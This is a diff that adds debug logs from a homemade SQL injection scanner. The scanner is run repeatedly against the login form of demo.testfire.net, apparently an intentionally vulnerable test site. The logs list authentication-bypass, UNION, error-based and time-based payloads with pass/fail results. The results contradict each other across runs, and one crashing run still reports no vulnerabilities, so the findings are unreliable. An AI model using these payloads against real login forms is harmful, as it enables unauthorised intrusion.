@@ -1,0 +1,2335 @@
+
+Log started on 2024-11-23 17:51:07.938804
+════════════════════════════════════════════════════════════════════════════════
+Starting Scanning forms on https://demo.testfire.net/login.jsp
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-23 17:40:06] Establishing baseline with benign input
+[DEBUG] [2024-11-23 17:40:53] Baseline established - Length: 6689 chars
+[INFO] [2024-11-23 17:40:53] Testing authentication_bypass payloads
+[DEBUG] [2024-11-23 17:40:53] Testing payload: Basic OR bypass
+[DEBUG] [2024-11-23 17:41:40] Testing payload: Admin login bypass
+[DEBUG] [2024-11-23 17:42:26] Testing payload: Always true condition
+[DEBUG] [2024-11-23 17:43:13] Testing payload: Double-OR bypass
+[INFO] [2024-11-23 17:44:00] Testing information_disclosure payloads
+[DEBUG] [2024-11-23 17:44:00] Testing payload: Version query
+[DEBUG] [2024-11-23 17:44:46] Testing payload: Database name
+[DEBUG] [2024-11-23 17:45:33] Testing payload: Table names
+[DEBUG] [2024-11-23 17:46:20] Testing payload: User tables
+[INFO] [2024-11-23 17:47:06] Testing blind_injection payloads
+[DEBUG] [2024-11-23 17:47:06] Testing payload: Time-based blind
+[DEBUG] [2024-11-23 17:47:53] Testing payload: Boolean-based blind
+[INFO] [2024-11-23 17:48:40] Testing error_based payloads
+[DEBUG] [2024-11-23 17:48:40] Testing payload: Convert error
+[DEBUG] [2024-11-23 17:49:27] Testing payload: Arithmetic error
+[DEBUG] [2024-11-23 17:50:13] Testing payload: XML parsing error
+════════════════════════════════════════════════════════════════════════════════
+Starting SQL Injection Scan Results
+────────────────────────────────────────────────────────────────────────────────
+[WARNING] [2024-11-23 17:51:07] No SQL injection vulnerabilities detected
+
+Log started on 2024-11-23 23:28:44.143431
+════════════════════════════════════════════════════════════════════════════════
+Starting SQL Injection Scan Initialization
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-23 23:28:01] Starting SQL injection scan on https://demo.testfire.net/login.jsp
+[DEBUG] [2024-11-23 23:28:01] Testing payload: Basic Authentication Bypass
+[DEBUG] [2024-11-23 23:28:05] Payload unsuccessful: Basic Authentication Bypass
+[DEBUG] [2024-11-23 23:28:05] Testing payload: Union Select Probe
+[DEBUG] [2024-11-23 23:28:08] Payload unsuccessful: Union Select Probe
+[DEBUG] [2024-11-23 23:28:08] Testing payload: Error Based
+[DEBUG] [2024-11-23 23:28:12] Payload unsuccessful: Error Based
+[DEBUG] [2024-11-23 23:28:12] Testing payload: Time Based
+[DEBUG] [2024-11-23 23:28:15] Payload unsuccessful: Time Based
+[DEBUG] [2024-11-23 23:28:15] Testing payload: Boolean Based
+[DEBUG] [2024-11-23 23:28:19] Payload unsuccessful: Boolean Based
+[DEBUG] [2024-11-23 23:28:19] Testing payload: Stacked Queries
+[DEBUG] [2024-11-23 23:28:22] Payload unsuccessful: Stacked Queries
+[DEBUG] [2024-11-23 23:28:22] Testing payload: Comment Attack
+[DEBUG] [2024-11-23 23:28:26] Payload unsuccessful: Comment Attack
+[DEBUG] [2024-11-23 23:28:26] Testing payload: LIKE Operator
+[DEBUG] [2024-11-23 23:28:29] Payload unsuccessful: LIKE Operator
+[DEBUG] [2024-11-23 23:28:29] Testing payload: Integer Overflow
+[DEBUG] [2024-11-23 23:28:33] Payload unsuccessful: Integer Overflow
+[DEBUG] [2024-11-23 23:28:33] Testing payload: Special Characters
+[DEBUG] [2024-11-23 23:28:36] Payload unsuccessful: Special Characters
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-23 23:28:36] Total tests conducted: 10
+[INFO] [2024-11-23 23:28:36] Successful injections: 0
+[INFO] [2024-11-23 23:28:36] Failed injections: 10
+[WARNING] [2024-11-23 23:28:36] 
+=== Failed SQL Injection Payloads ===
+[WARNING] [2024-11-23 23:28:36] Name: Basic Authentication Bypass
+Payload: ' OR '1'='1
+Description: Simple login bypass attempt
+[WARNING] [2024-11-23 23:28:36] Name: Union Select Probe
+Payload: ' UNION SELECT NULL--
+Description: Tests for UNION injection possibility
+[WARNING] [2024-11-23 23:28:36] Name: Error Based
+Payload: ' OR 1=CONVERT(int,@@version)--
+Description: Attempts to trigger SQL error messages
+[WARNING] [2024-11-23 23:28:36] Name: Time Based
+Payload: '; WAITFOR DELAY '0:0:5'--
+Description: Tests for blind injection via time delays
+[WARNING] [2024-11-23 23:28:36] Name: Boolean Based
+Payload: ' OR 1=1--
+Description: Tests for boolean-based blind injection
+[WARNING] [2024-11-23 23:28:36] Name: Stacked Queries
+Payload: '; SELECT sleep(5)--
+Description: Tests for multiple query execution
+[WARNING] [2024-11-23 23:28:36] Name: Comment Attack
+Payload: '--
+Description: Basic comment injection test
+[WARNING] [2024-11-23 23:28:36] Name: LIKE Operator
+Payload: ' OR 'a'='a
+Description: Tests string comparison
+[WARNING] [2024-11-23 23:28:36] Name: Integer Overflow
+Payload: 1234567890123456789
+Description: Tests for integer overflow vulnerabilities
+[WARNING] [2024-11-23 23:28:36] Name: Special Characters
+Payload: '"()/*\
+Description: Tests handling of special characters
+
+Log started on 2024-11-23 23:33:24.482621
+════════════════════════════════════════════════════════════════════════════════
+Starting SQL Injection Scan Initialization
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-23 23:32:41] Starting SQL injection scan on https://demo.testfire.net/login.jsp
+[DEBUG] [2024-11-23 23:32:41] Testing payload: Basic Authentication Bypass
+[SUCCESS] [2024-11-23 23:32:45] Possible successful injection detected: account
+[SUCCESS] [2024-11-23 23:32:45] Potential SQL injection vulnerability found with payload: Basic Authentication Bypass
+[DEBUG] [2024-11-23 23:32:45] Testing payload: Union Select Probe
+[SUCCESS] [2024-11-23 23:32:49] Possible successful injection detected: account
+[SUCCESS] [2024-11-23 23:32:49] Potential SQL injection vulnerability found with payload: Union Select Probe
+[DEBUG] [2024-11-23 23:32:49] Testing payload: Error Based
+[SUCCESS] [2024-11-23 23:32:52] Possible successful injection detected: account
+[SUCCESS] [2024-11-23 23:32:52] Potential SQL injection vulnerability found with payload: Error Based
+[DEBUG] [2024-11-23 23:32:52] Testing payload: Time Based
+[SUCCESS] [2024-11-23 23:32:56] Possible successful injection detected: account
+[SUCCESS] [2024-11-23 23:32:56] Potential SQL injection vulnerability found with payload: Time Based
+[DEBUG] [2024-11-23 23:32:56] Testing payload: Boolean Based
+[SUCCESS] [2024-11-23 23:32:59] Possible successful injection detected: account
+[SUCCESS] [2024-11-23 23:32:59] Potential SQL injection vulnerability found with payload: Boolean Based
+[DEBUG] [2024-11-23 23:32:59] Testing payload: Stacked Queries
+[SUCCESS] [2024-11-23 23:33:03] Possible successful injection detected: account
+[SUCCESS] [2024-11-23 23:33:03] Potential SQL injection vulnerability found with payload: Stacked Queries
+[DEBUG] [2024-11-23 23:33:03] Testing payload: Comment Attack
+[SUCCESS] [2024-11-23 23:33:06] Possible successful injection detected: account
+[SUCCESS] [2024-11-23 23:33:06] Potential SQL injection vulnerability found with payload: Comment Attack
+[DEBUG] [2024-11-23 23:33:06] Testing payload: LIKE Operator
+[SUCCESS] [2024-11-23 23:33:10] Possible successful injection detected: account
+[SUCCESS] [2024-11-23 23:33:10] Potential SQL injection vulnerability found with payload: LIKE Operator
+[DEBUG] [2024-11-23 23:33:10] Testing payload: Integer Overflow
+[SUCCESS] [2024-11-23 23:33:13] Possible successful injection detected: account
+[SUCCESS] [2024-11-23 23:33:13] Potential SQL injection vulnerability found with payload: Integer Overflow
+[DEBUG] [2024-11-23 23:33:13] Testing payload: Special Characters
+[SUCCESS] [2024-11-23 23:33:17] Possible successful injection detected: account
+[SUCCESS] [2024-11-23 23:33:17] Potential SQL injection vulnerability found with payload: Special Characters
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-23 23:33:17] Total tests conducted: 10
+[INFO] [2024-11-23 23:33:17] Successful injections: 10
+[INFO] [2024-11-23 23:33:17] Failed injections: 0
+[SUCCESS] [2024-11-23 23:33:17] 
+=== Successful SQL Injection Payloads ===
+[SUCCESS] [2024-11-23 23:33:17] Name: Basic Authentication Bypass
+Payload: ' OR '1'='1
+Description: Simple login bypass attempt
+[SUCCESS] [2024-11-23 23:33:17] Name: Union Select Probe
+Payload: ' UNION SELECT NULL--
+Description: Tests for UNION injection possibility
+[SUCCESS] [2024-11-23 23:33:17] Name: Error Based
+Payload: ' OR 1=CONVERT(int,@@version)--
+Description: Attempts to trigger SQL error messages
+[SUCCESS] [2024-11-23 23:33:17] Name: Time Based
+Payload: '; WAITFOR DELAY '0:0:5'--
+Description: Tests for blind injection via time delays
+[SUCCESS] [2024-11-23 23:33:17] Name: Boolean Based
+Payload: ' OR 1=1--
+Description: Tests for boolean-based blind injection
+[SUCCESS] [2024-11-23 23:33:17] Name: Stacked Queries
+Payload: '; SELECT sleep(5)--
+Description: Tests for multiple query execution
+[SUCCESS] [2024-11-23 23:33:17] Name: Comment Attack
+Payload: '--
+Description: Basic comment injection test
+[SUCCESS] [2024-11-23 23:33:17] Name: LIKE Operator
+Payload: ' OR 'a'='a
+Description: Tests string comparison
+[SUCCESS] [2024-11-23 23:33:17] Name: Integer Overflow
+Payload: 1234567890123456789
+Description: Tests for integer overflow vulnerabilities
+[SUCCESS] [2024-11-23 23:33:17] Name: Special Characters
+Payload: '"()/*\
+Description: Tests handling of special characters
+
+Log started on 2024-11-23 23:38:10.894846
+[DEBUG] [2024-11-23 23:37:21] Capturing baseline response...
+[DEBUG] [2024-11-23 23:37:25] Baseline captured successfully
+════════════════════════════════════════════════════════════════════════════════
+Starting SQL Injection Scan Initialization
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-23 23:37:25] Starting SQL injection scan on https://demo.testfire.net/login.jsp
+[DEBUG] [2024-11-23 23:37:25] Testing payload: Basic Authentication Bypass
+[DEBUG] [2024-11-23 23:37:29] No significant differences found for Basic Authentication Bypass
+[DEBUG] [2024-11-23 23:37:29] Payload unsuccessful: Basic Authentication Bypass
+[DEBUG] [2024-11-23 23:37:29] Testing payload: Union Select Probe
+[DEBUG] [2024-11-23 23:37:33] No significant differences found for Union Select Probe
+[DEBUG] [2024-11-23 23:37:33] Payload unsuccessful: Union Select Probe
+[DEBUG] [2024-11-23 23:37:33] Testing payload: Error Based
+[DEBUG] [2024-11-23 23:37:37] No significant differences found for Error Based
+[DEBUG] [2024-11-23 23:37:37] Payload unsuccessful: Error Based
+[DEBUG] [2024-11-23 23:37:37] Testing payload: Time Based
+[DEBUG] [2024-11-23 23:37:41] No significant differences found for Time Based
+[DEBUG] [2024-11-23 23:37:41] Payload unsuccessful: Time Based
+[DEBUG] [2024-11-23 23:37:41] Testing payload: Boolean Based
+[DEBUG] [2024-11-23 23:37:45] No significant differences found for Boolean Based
+[DEBUG] [2024-11-23 23:37:45] Payload unsuccessful: Boolean Based
+[DEBUG] [2024-11-23 23:37:45] Testing payload: Stacked Queries
+[DEBUG] [2024-11-23 23:37:49] No significant differences found for Stacked Queries
+[DEBUG] [2024-11-23 23:37:49] Payload unsuccessful: Stacked Queries
+[DEBUG] [2024-11-23 23:37:49] Testing payload: Comment Attack
+[DEBUG] [2024-11-23 23:37:52] No significant differences found for Comment Attack
+[DEBUG] [2024-11-23 23:37:52] Payload unsuccessful: Comment Attack
+[DEBUG] [2024-11-23 23:37:52] Testing payload: LIKE Operator
+[DEBUG] [2024-11-23 23:37:56] No significant differences found for LIKE Operator
+[DEBUG] [2024-11-23 23:37:56] Payload unsuccessful: LIKE Operator
+[DEBUG] [2024-11-23 23:37:56] Testing payload: Integer Overflow
+[DEBUG] [2024-11-23 23:37:59] No significant differences found for Integer Overflow
+[DEBUG] [2024-11-23 23:37:59] Payload unsuccessful: Integer Overflow
+[DEBUG] [2024-11-23 23:37:59] Testing payload: Special Characters
+[DEBUG] [2024-11-23 23:38:03] No significant differences found for Special Characters
+[DEBUG] [2024-11-23 23:38:03] Payload unsuccessful: Special Characters
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-23 23:38:03] Total tests conducted: 10
+[INFO] [2024-11-23 23:38:03] Successful injections: 0
+[INFO] [2024-11-23 23:38:03] Failed injections: 10
+[WARNING] [2024-11-23 23:38:03] 
+=== Failed SQL Injection Payloads ===
+[WARNING] [2024-11-23 23:38:03] Name: Basic Authentication Bypass
+Payload: ' OR '1'='1
+Description: Simple login bypass attempt
+[WARNING] [2024-11-23 23:38:03] Name: Union Select Probe
+Payload: ' UNION SELECT NULL--
+Description: Tests for UNION injection possibility
+[WARNING] [2024-11-23 23:38:03] Name: Error Based
+Payload: ' OR 1=CONVERT(int,@@version)--
+Description: Attempts to trigger SQL error messages
+[WARNING] [2024-11-23 23:38:03] Name: Time Based
+Payload: '; WAITFOR DELAY '0:0:5'--
+Description: Tests for blind injection via time delays
+[WARNING] [2024-11-23 23:38:03] Name: Boolean Based
+Payload: ' OR 1=1--
+Description: Tests for boolean-based blind injection
+[WARNING] [2024-11-23 23:38:03] Name: Stacked Queries
+Payload: '; SELECT sleep(5)--
+Description: Tests for multiple query execution
+[WARNING] [2024-11-23 23:38:03] Name: Comment Attack
+Payload: '--
+Description: Basic comment injection test
+[WARNING] [2024-11-23 23:38:03] Name: LIKE Operator
+Payload: ' OR 'a'='a
+Description: Tests string comparison
+[WARNING] [2024-11-23 23:38:03] Name: Integer Overflow
+Payload: 1234567890123456789
+Description: Tests for integer overflow vulnerabilities
+[WARNING] [2024-11-23 23:38:03] Name: Special Characters
+Payload: '"()/*\
+Description: Tests handling of special characters
+
+Log started on 2024-11-24 18:00:34.340151
+════════════════════════════════════════════════════════════════════════════════
+Starting SQL Injection Scan Initialization
+────────────────────────────────────────────────────────────────────────────────
+
+Log started on 2024-11-24 20:50:12.330839
+════════════════════════════════════════════════════════════════════════════════
+Starting SQL Injection Scan Initialization
+────────────────────────────────────────────────────────────────────────────────
+
+Log started on 2024-11-26 20:55:43.810358
+════════════════════════════════════════════════════════════════════════════════
+Starting SQL Injection Scan Initialization
+────────────────────────────────────────────────────────────────────────────────
+
+Log started on 2024-11-26 21:45:47.426632
+════════════════════════════════════════════════════════════════════════════════
+Starting SQL Injection Scan Initialization
+────────────────────────────────────────────────────────────────────────────────
+
+Log started on 2024-11-26 21:46:33.972397
+════════════════════════════════════════════════════════════════════════════════
+Starting SQL Injection Scan Initialization
+────────────────────────────────────────────────────────────────────────────────
+
+Log started on 2024-11-26 21:51:28.902520
+════════════════════════════════════════════════════════════════════════════════
+Starting SQL Injection Scan Initialization
+────────────────────────────────────────────────────────────────────────────────
+
+Log started on 2024-11-26 22:03:10.008088
+════════════════════════════════════════════════════════════════════════════════
+Starting SQL Injection Scan Initialization
+────────────────────────────────────────────────────────────────────────────────
+
+Log started on 2024-11-26 22:04:50.616923
+════════════════════════════════════════════════════════════════════════════════
+Starting SQL Injection Scan Initialization
+────────────────────────────────────────────────────────────────────────────────
+
+Log started on 2024-11-26 22:07:17.646862
+════════════════════════════════════════════════════════════════════════════════
+Starting SQL Injection Scan Initialization
+────────────────────────────────────────────────────────────────────────────────
+
+Log started on 2024-11-26 22:09:53.883593
+════════════════════════════════════════════════════════════════════════════════
+Starting SQL Injection Scan Initialization
+────────────────────────────────────────────────────────────────────────────────
+
+Log started on 2024-11-26 22:13:41.723329
+════════════════════════════════════════════════════════════════════════════════
+Starting SQL Injection Scan Initialization
+────────────────────────────────────────────────────────────────────────────────
+
+Log started on 2024-11-26 22:23:14.538286
+════════════════════════════════════════════════════════════════════════════════
+Starting Starting SQL Injection Scan: https://demo.testfire.net/login.jsp
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-26 22:22:21] Found 2 forms to test
+[INFO] [2024-11-26 22:22:21] Capturing baseline responses
+[SUCCESS] [2024-11-26 22:22:28] Successfully captured baselines
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Basic Authentication Bypass
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:22:28] Description: Simple login bypass attempt
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Union Select Probe
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:22:36] Description: Tests for UNION injection possibility
+[WARNING] [2024-11-26 22:22:44] Potential vulnerability found in form 'frmSearch'
+Payload: ' UNION SELECT NULL--
+Reason: SQL error pattern found: row
+[WARNING] [2024-11-26 22:22:44] Potential vulnerability found in form 'frmSearch'
+Payload: ' UNION SELECT NULL--
+Reason: SQL error pattern found: row
+[WARNING] [2024-11-26 22:22:44] Potential vulnerability found in form 'login'
+Payload: ' UNION SELECT NULL--
+Reason: SQL error pattern found: row
+[WARNING] [2024-11-26 22:22:44] Potential vulnerability found in form 'login'
+Payload: ' UNION SELECT NULL--
+Reason: SQL error pattern found: row
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Error Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:22:44] Description: Attempts to trigger SQL error messages
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Time Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:22:51] Description: Tests for blind injection via time delays
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Boolean Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:22:59] Description: Tests for boolean-based blind injection
+[WARNING] [2024-11-26 22:23:07] Potential vulnerability found in form 'frmSearch'
+Payload: ' OR 1=1--
+Reason: SQL error pattern found: if
+[WARNING] [2024-11-26 22:23:07] Potential vulnerability found in form 'frmSearch'
+Payload: ' OR 1=1--
+Reason: SQL error pattern found: if
+[WARNING] [2024-11-26 22:23:07] Potential vulnerability found in form 'login'
+Payload: ' OR 1=1--
+Reason: SQL error pattern found: if
+[WARNING] [2024-11-26 22:23:07] Potential vulnerability found in form 'login'
+Payload: ' OR 1=1--
+Reason: SQL error pattern found: if
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results
+────────────────────────────────────────────────────────────────────────────────
+[WARNING] [2024-11-26 22:23:07] Found 8 potential SQL injection vulnerabilities:
+================================================================================
+
+1. Form: frmSearch
+   Payload: Union Select Probe
+   Value: ' UNION SELECT NULL--
+   Reason: SQL error pattern found: row
+--------------------------------------------------------------------------------
+
+2. Form: frmSearch
+   Payload: Union Select Probe
+   Value: ' UNION SELECT NULL--
+   Reason: SQL error pattern found: row
+--------------------------------------------------------------------------------
+
+3. Form: login
+   Payload: Union Select Probe
+   Value: ' UNION SELECT NULL--
+   Reason: SQL error pattern found: row
+--------------------------------------------------------------------------------
+
+4. Form: login
+   Payload: Union Select Probe
+   Value: ' UNION SELECT NULL--
+   Reason: SQL error pattern found: row
+--------------------------------------------------------------------------------
+
+5. Form: frmSearch
+   Payload: Boolean Based
+   Value: ' OR 1=1--
+   Reason: SQL error pattern found: if
+--------------------------------------------------------------------------------
+
+6. Form: frmSearch
+   Payload: Boolean Based
+   Value: ' OR 1=1--
+   Reason: SQL error pattern found: if
+--------------------------------------------------------------------------------
+
+7. Form: login
+   Payload: Boolean Based
+   Value: ' OR 1=1--
+   Reason: SQL error pattern found: if
+--------------------------------------------------------------------------------
+
+8. Form: login
+   Payload: Boolean Based
+   Value: ' OR 1=1--
+   Reason: SQL error pattern found: if
+--------------------------------------------------------------------------------
+
+Log started on 2024-11-26 22:29:43.818523
+════════════════════════════════════════════════════════════════════════════════
+Starting Starting SQL Injection Scan: https://demo.testfire.net/login.jsp
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-26 22:28:53] Found 2 forms to test
+[INFO] [2024-11-26 22:28:53] Capturing baseline responses
+[SUCCESS] [2024-11-26 22:29:00] Successfully captured baselines
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Basic Authentication Bypass
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:29:00] Description: Simple login bypass attempt
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Union Select Probe
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:29:08] Description: Tests for UNION injection possibility
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Error Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:29:15] Description: Attempts to trigger SQL error messages
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Time Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:29:22] Description: Tests for blind injection via time delays
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Boolean Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:29:29] Description: Tests for boolean-based blind injection
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-26 22:29:36] No SQL injection vulnerabilities detected
+
+Log started on 2024-11-26 22:31:10.060756
+════════════════════════════════════════════════════════════════════════════════
+Starting Starting SQL Injection Scan: https://demo.testfire.net/login.jsp
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-26 22:30:21] Found 2 forms to test
+[INFO] [2024-11-26 22:30:21] Capturing baseline responses
+[SUCCESS] [2024-11-26 22:30:28] Successfully captured baselines
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Basic Authentication Bypass
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:30:28] Description: Simple login bypass attempt
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Union Select Probe
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:30:35] Description: Tests for UNION injection possibility
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Error Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:30:42] Description: Attempts to trigger SQL error messages
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Time Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:30:49] Description: Tests for blind injection via time delays
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Boolean Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:30:55] Description: Tests for boolean-based blind injection
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-26 22:31:02] No SQL injection vulnerabilities detected
+
+Log started on 2024-11-26 22:36:33.255019
+════════════════════════════════════════════════════════════════════════════════
+Starting Starting SQL Injection Scan: https://demo.testfire.net/login.jsp
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-26 22:36:25] Found 2 forms to test
+[INFO] [2024-11-26 22:36:25] Capturing baseline responses
+[DEBUG] [2024-11-26 22:36:25] Final URL after submission: https://demo.testfire.net/login.jsp
+[DEBUG] [2024-11-26 22:36:25] Final URL after submission: https://demo.testfire.net/login.jsp
+[SUCCESS] [2024-11-26 22:36:25] Successfully captured baselines
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Basic Authentication Bypass
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:36:25] Description: Simple login bypass attempt
+[DEBUG] [2024-11-26 22:36:25] Final URL after submission: https://demo.testfire.net/login.jsp
+[DEBUG] [2024-11-26 22:36:25] Final URL after submission: https://demo.testfire.net/login.jsp
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Union Select Probe
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:36:25] Description: Tests for UNION injection possibility
+[DEBUG] [2024-11-26 22:36:25] Final URL after submission: https://demo.testfire.net/login.jsp
+[DEBUG] [2024-11-26 22:36:25] Final URL after submission: https://demo.testfire.net/login.jsp
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Error Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:36:25] Description: Attempts to trigger SQL error messages
+[DEBUG] [2024-11-26 22:36:25] Final URL after submission: https://demo.testfire.net/login.jsp
+[DEBUG] [2024-11-26 22:36:25] Final URL after submission: https://demo.testfire.net/login.jsp
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Time Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:36:25] Description: Tests for blind injection via time delays
+[DEBUG] [2024-11-26 22:36:25] Final URL after submission: https://demo.testfire.net/login.jsp
+[DEBUG] [2024-11-26 22:36:25] Final URL after submission: https://demo.testfire.net/login.jsp
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Boolean Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:36:25] Description: Tests for boolean-based blind injection
+[DEBUG] [2024-11-26 22:36:25] Final URL after submission: https://demo.testfire.net/login.jsp
+[DEBUG] [2024-11-26 22:36:25] Final URL after submission: https://demo.testfire.net/login.jsp
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-26 22:36:25] No SQL injection vulnerabilities detected
+
+Log started on 2024-11-26 22:38:34.860851
+════════════════════════════════════════════════════════════════════════════════
+Starting Starting SQL Injection Scan: https://demo.testfire.net/login.jsp
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-26 22:38:27] Found 2 forms to test
+[INFO] [2024-11-26 22:38:27] Capturing baseline responses
+[DEBUG] [2024-11-26 22:38:27] Submitting form: frmSearch with value: baseline123
+[ERROR] [2024-11-26 22:38:27] Error capturing form response: WebDriver.submit_form() got an unexpected keyword argument 'form_id'
+[DEBUG] [2024-11-26 22:38:27] Submitting form: login with value: baseline123
+[ERROR] [2024-11-26 22:38:27] Error capturing form response: WebDriver.submit_form() got an unexpected keyword argument 'form_id'
+[SUCCESS] [2024-11-26 22:38:27] Successfully captured baselines
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Basic Authentication Bypass
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:38:27] Description: Simple login bypass attempt
+[DEBUG] [2024-11-26 22:38:27] Submitting form: frmSearch with value: ' OR '1'='1
+[ERROR] [2024-11-26 22:38:27] Error capturing form response: WebDriver.submit_form() got an unexpected keyword argument 'form_id'
+[DEBUG] [2024-11-26 22:38:27] Submitting form: login with value: ' OR '1'='1
+[ERROR] [2024-11-26 22:38:27] Error capturing form response: WebDriver.submit_form() got an unexpected keyword argument 'form_id'
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Union Select Probe
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:38:27] Description: Tests for UNION injection possibility
+[DEBUG] [2024-11-26 22:38:27] Submitting form: frmSearch with value: ' UNION SELECT NULL--
+[ERROR] [2024-11-26 22:38:27] Error capturing form response: WebDriver.submit_form() got an unexpected keyword argument 'form_id'
+[DEBUG] [2024-11-26 22:38:27] Submitting form: login with value: ' UNION SELECT NULL--
+[ERROR] [2024-11-26 22:38:27] Error capturing form response: WebDriver.submit_form() got an unexpected keyword argument 'form_id'
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Error Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:38:27] Description: Attempts to trigger SQL error messages
+[DEBUG] [2024-11-26 22:38:27] Submitting form: frmSearch with value: ' OR 1=CONVERT(int,@@version)--
+[ERROR] [2024-11-26 22:38:27] Error capturing form response: WebDriver.submit_form() got an unexpected keyword argument 'form_id'
+[DEBUG] [2024-11-26 22:38:27] Submitting form: login with value: ' OR 1=CONVERT(int,@@version)--
+[ERROR] [2024-11-26 22:38:27] Error capturing form response: WebDriver.submit_form() got an unexpected keyword argument 'form_id'
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Time Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:38:27] Description: Tests for blind injection via time delays
+[DEBUG] [2024-11-26 22:38:27] Submitting form: frmSearch with value: '; WAITFOR DELAY '0:0:5'--
+[ERROR] [2024-11-26 22:38:27] Error capturing form response: WebDriver.submit_form() got an unexpected keyword argument 'form_id'
+[DEBUG] [2024-11-26 22:38:27] Submitting form: login with value: '; WAITFOR DELAY '0:0:5'--
+[ERROR] [2024-11-26 22:38:27] Error capturing form response: WebDriver.submit_form() got an unexpected keyword argument 'form_id'
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Boolean Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:38:27] Description: Tests for boolean-based blind injection
+[DEBUG] [2024-11-26 22:38:27] Submitting form: frmSearch with value: ' OR 1=1--
+[ERROR] [2024-11-26 22:38:27] Error capturing form response: WebDriver.submit_form() got an unexpected keyword argument 'form_id'
+[DEBUG] [2024-11-26 22:38:27] Submitting form: login with value: ' OR 1=1--
+[ERROR] [2024-11-26 22:38:27] Error capturing form response: WebDriver.submit_form() got an unexpected keyword argument 'form_id'
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-26 22:38:27] No SQL injection vulnerabilities detected
+
+Log started on 2024-11-26 22:43:33.597026
+════════════════════════════════════════════════════════════════════════════════
+Starting Starting SQL Injection Scan: https://demo.testfire.net/login.jsp
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-26 22:42:46] Found 2 forms to test
+[INFO] [2024-11-26 22:42:46] Capturing baseline responses
+[SUCCESS] [2024-11-26 22:42:52] Successfully captured baselines
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Basic Authentication Bypass
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:42:52] Description: Simple login bypass attempt
